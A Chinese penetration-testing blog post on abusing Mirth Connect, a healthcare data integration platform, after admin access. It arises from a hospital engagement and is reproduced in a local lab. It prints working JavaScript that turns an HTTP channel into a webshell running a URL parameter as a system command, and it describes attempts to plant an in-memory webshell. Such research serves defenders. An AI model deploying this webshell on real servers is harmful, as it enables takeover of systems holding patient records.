# 关于Mirth Connect的一些利用方式-先知社区

> **来源**: https://xz.aliyun.com/news/17991  
> **文章ID**: 17991

---

## 缘起

在某次渗透任务,发现一个医院接口管理系统十分眼熟

![图片.png](images/img_17991_000.png)

仔细看了下发现应该是用Mirth Connect改的,但是使用历史漏洞打了一波,并无成果.

![图片.png](images/img_17991_001.png)使用其他地方获取到的习惯密码进入后台,感觉应该能打,但是由于时间紧,没有详细研究,就只能当弱口令交了报告

事后觉得不甘心,于是便打算本地搭建一套,看看能否getshell,经过测试可以使用通道的脚本功能实现命令执行的功能.

## 环境搭建

`Mirth Connect是一个开源的医疗信息集成系统，支持多种消息标准的转换、过滤、提取和路由。该平台可管理从小型诊所到大型医疗信息交换系统的患者数据。它提供了直观的管理界面，便于开发和管理消息通道。`

Mirth Connect是个开源项目,常用于医疗行业,直接去github下载即可

`https://github.com/nextgenhealthcare/connect/releases`

安装很简单,甚至还会自动给你下jdk,安装好之后双击Mirth Connect Administrator,即可打开管理员界面

![图片.png](images/img_17991_002.png)

点击启动即可

![图片.png](images/img_17991_003.png)

## 无回显命令执行

进入主页面,新建一个通道

![图片.png](images/img_17991_004.png)选择http监听,设置好监听端口,也可以设置路径

![图片.png](images/img_17991_005.png)通道存在一个脚本执行的地方

![图片.png](images/img_17991_006.png)在旁边发现存在可以调用java class

![图片.png](images/img_17991_007.png)

直接测试一手exec看看能否执行

![图片.png](images/img_17991_008.png)弹计算器成功,说明是可以直接调用exec执行

![图片.png](images/img_17991_009.png)

现在能执行命令了,他又是http,那么是否可以回显?

经过测试将`Response:`设置为`Postprocessor`可以回显字符串

![图片.png](images/img_17991_010.png)

使用java.lang.ProcessBuilder执行命令并回显

![图片.png](images/img_17991_011.png)![图片.png](images/img_17991_012.png)

## 将通道变成cmd马

现在已经可以执行命令并进行回显,但是每次执行都需要重新改js内容,那么是否可以获取我们url的参数进行命令执行呢?

经过查找发现其存在一个`Source`map存储了所有请求的键值对,我们要都请求就在`parameters`中

![图片.png](images/img_17991_013.png)

既然找到了请求参数,那就可以实现cmd马的功能了

使用sourceMap.get("parameters")获取参数,再判断一下系统类型即可

> try{var var4=sourceMap.get("parameters");
>
> var var3=var4.get("abc")
>
> var isWindows = java.lang.System.getProperty("os.name").toLowerCase().contains("win");
>
> var command = isWindows ? ["cmd.exe", "/c", var3] : ["/bin/sh", "-c", var3];
>
> var var2 = new java.util.Scanner(new java.lang.ProcessBuilder(command).start().getInputStream()).useDelimiter("\\A").next();
>
> }
>
> catch (e){
>
> return e;
>
> }
>
> return var2;

![图片.png](images/img_17991_014.png)![图片.png](images/img_17991_015.png)

## 失败的内存马注入

上面实现的功能,需要我们新建端口的监听,需要服务器没有nat,如果存在nat,只能访问登陆页面,那就没法访问到新建的通道的端口

既然通道是存在代码执行能力,既然可以代码执行,是否能写入内存马呢?

要注入内存马,得先知道他的中间件类型

在登陆页面显示了中间件是jetty

![图片.png](images/img_17991_016.png)再查看pid,可以发现监听的端口10010,10086和登陆端口18080是同一个进程启动的,这也许可以把内存马打到18080上去

![图片.png](images/img_17991_017.png)使用JMG工具生成一个jetty的内存马

![图片.png](images/img_17991_018.png)![图片.png](images/img_17991_019.png)

注入之后测试几个端口都没连接成功

![图片.png](images/img_17991_020.png)

是不是生成的代码没法注入class?

手动生成一个弹计算器的class加载测试一下

![图片.png](images/img_17991_021.png)

![图片.png](images/img_17991_022.png)可以弹出说明确实是能加载class成功

![图片.png](images/img_17991_023.png)是不是classloader层级的问题?可能各个端口不共用一个classloader?

参照内存马中的逻辑,写一个遍历classloader跑一下

![图片.png](images/img_17991_024.png)![图片.png](images/img_17991_025.png)![图片.png](images/img_17991_026.png)![图片.png](images/img_17991_027.png)![图片.png](images/img_17991_028.png)![图片.png](images/img_17991_029.png)

发现各个端口都是用的urlclassloader,jetty的不应该是webappclassloader?

怀疑是不是遍历读取不全,使用arthas获取整个jvm的classloader看看

![图片.png](images/img_17991_030.png)

确实存在webappclassloader

使用`classloader -t`查看各个classloader层级关系

![图片.png](images/img_17991_031.png)![图片.png](images/img_17991_032.png)存在是存在,但是是urlclassloader的下面,java父classloader是无法找到子classloader的,所以没法注入内存马,宣告失败

想获取到子loader,貌似只能用agent通过`ins.getAllLoadedClasses()`获取

使用vagent可以成功上马

![图片.png](images/img_17991_033.png)![图片.png](images/img_17991_034.png)
